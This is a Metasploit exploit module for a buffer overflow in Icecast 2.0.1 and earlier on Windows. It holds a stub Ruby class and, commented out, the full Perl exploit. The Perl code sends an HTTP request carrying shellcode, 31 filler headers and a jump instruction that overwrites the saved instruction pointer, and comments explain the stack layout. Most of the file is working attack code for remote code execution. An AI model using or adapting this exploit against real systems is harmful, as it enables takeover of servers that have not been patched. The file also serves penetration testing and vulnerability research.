require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Icecast (<= 2.0.1) Header Overwrite (win32)',
			'Description'    => %q{
				This module exploits a buffer overflow in the header parsing
				of icecast, discovered by Luigi Auriemma.  Sending 32 HTTP
				headers will cause a write one past the end of a pointer
				array.  On win32 this happens to overwrite the saved
				instruction pointer, and on linux (depending on compiler,
				etc) this seems to generally overwrite nothing crucial (read
				not exploitable).

				!! This exploit uses ExitThread(), this will leave icecast
				thinking the thread is still in use, and the thread counter
				won't be decremented.  This means for each time your payload
				exists, the counter will be left incremented, and eventually
				the threadpool limit will be maxed.  So you can multihit,
				but only till you fill the threadpool.
					
			},
			'Author'         => [ 'spoonm', 'Luigi Auriemma <aluigi@autistici.org> (bug and exploit info)' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '10406'],
					[ 'BID', '11271'],
					[ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2004-09/0366.html'],
					[ 'MIL', '25'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 2000,
					'BadChars' => "\x0d\x0a\x00",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000, winnt, winxp, win2003',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Sep 28 2004',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::icecast_header;
use strict;
use base 'Msf::Exploit';
use Msf::Socket::Tcp;
use Pex::Text;

my $advanced = {
	'LessTraffic' => [0, 'Use smaller (but less real looking) http headers'],
  };

my $info = {
	'Name'    => 'Icecast (<= 2.0.1) Header Overwrite (win32)',
	'Version' => '$Revision$',
	'Authors' =>
	  [
		'spoonm <ninjatools [at] hush.com>',
		'Luigi Auriemma <aluigi [at] autistici.org> (bug and exploit info)',
	  ],

	'Arch'    => [ 'x86' ],
	'OS'      => [ 'win32', 'win2000', 'winnt', 'winxp', 'win2003' ],
	'Priv'    => 0,

	'AutoOpts'  => { 'EXITFUNC' => 'thread' },
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 8000],
	  },

	'Payload' =>
	  {
		'Space'     => 2000,
		'BadChars'  => "\r\n\x00",
		'MinNops'   => 0,
		'MaxNops'   => 0, # nops are for slackers.
	  },

	'Description'  => Pex::Text::Freeform(qq{
      This module exploits a buffer overflow in the header parsing of icecast,
      discovered by Luigi Auriemma.  Sending 32 HTTP headers will cause a write
      one past the end of a pointer array.  On win32 this happens to overwrite
      the saved instruction pointer, and on linux (depending on compiler, etc)
      this seems to generally overwrite nothing crucial (read not exploitable).

      !! This exploit uses ExitThread(), this will leave icecast thinking the
      thread is still in use, and the thread counter won't be decremented.  This
      means for each time your payload exists, the counter will be left
      incremented, and eventually the threadpool limit will be maxed.  So you
      can multihit, but only till you fill the threadpool.
}),

	'Refs'  =>
	  [
		[ 'OSVDB', '10406' ],
		[ 'BID', '11271' ],
		[ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2004-09/0366.html' ],
		[ 'MIL', '25' ],
	  ],

	'Keys' => ['icecase'],

	'DisclosureDate' => 'Sep 28 2004',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);

	return($self);
}

# Interesting that ebp is pushed after the local variables, and the line array
# is right before the saved eip, so overrunning it just by 1 element overwrites
# eip, making an interesting exploit....
# .text:00414C00                 sub     esp, 94h
# .text:00414C06                 push    ebx
# .text:00414C07                 push    ebp
# .text:00414C08                 push    esi

sub Exploit {
	my $self = shift;

	my $targetHost  = $self->GetVar('RHOST');
	my $targetPort  = $self->GetVar('RPORT');
	my $targetIndex = $self->GetVar('TARGET');
	my $encodedPayload = $self->GetVar('EncodedPayload');
	my $shellcode   = $encodedPayload->Payload;

	my $sock = Msf::Socket::Tcp->new(
		'PeerAddr' => $targetHost,
		'PeerPort' => $targetPort,
	  );
	if($sock->IsError) {
		$self->PrintLine('Error creating socket: ' . $sock->GetError);
		return;
	}

  # bounce bounce bouncey bounce.. (our chunk gets free'd, so do a little dance)
  # jmp 12
	my $evul = "\xeb\x0c / HTTP/1.1 $shellcode\r\n";

	# look somewhat realistic, or something..
	# because our above http verb looks so convincing...
	if($self->GetLocal('LessTraffic')) {
		$evul .= " \r\n" x 31;
	}
	else {
		$evul .= "Accept: text/html\r\n" x 31;
	}

	# jmp [esp+4]
	$evul .= "\xff\x64\x24\x04\r\n";
	$evul .= "\r\n";

	$sock->Send($evul);

	return;
}

1;

=end


end
end	
